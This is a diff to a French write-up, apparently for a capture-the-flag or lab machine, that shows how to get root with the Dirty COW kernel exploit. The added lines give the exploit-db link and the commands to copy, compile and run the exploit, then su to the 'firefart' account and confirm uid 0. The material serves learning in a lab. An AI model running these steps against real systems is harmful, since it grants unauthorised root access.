@@ -16,9 +16,10 @@ On se rend compte que la version de Kernel (3.2.0-91) est vulnerable a la faille
 
 Apres quelques recherches sur le net, on tombe sur ce site qui met a disposition un exploit pour Dirty COW.
 ```
-Lien: https://www.exploit-db.com/exploits/40839
+https://www.exploit-db.com/exploits/40839
 ```
 
+# Exploit
 On copie le fichier ```exploit_dirty.c``` dans la VM.
 ```
 scp exploit_dirty.c laurie@<IP>:/home/laurie 
@@ -28,6 +29,22 @@ On compile
 ```
 gcc -pthread exploit_dirty.c -o dirty -lcrypt
 ```
+
+On execute
+```
+./dirty <NEW-PASSWORD>
+```
+
+On execute ```su firefart``` avec le <NEW-PASSWORD> choisi.
+
+On verifie l'uid
+```
+id
+```
+
+On se rend compte que nous sommes uid=0. BINGO!!!
+
+On se deplace dans le dossier ```/root``` et avec un ```cat README``` on peut se rendre compte que nous sommes root sur la machine!
 
 
 # Explication de la faille
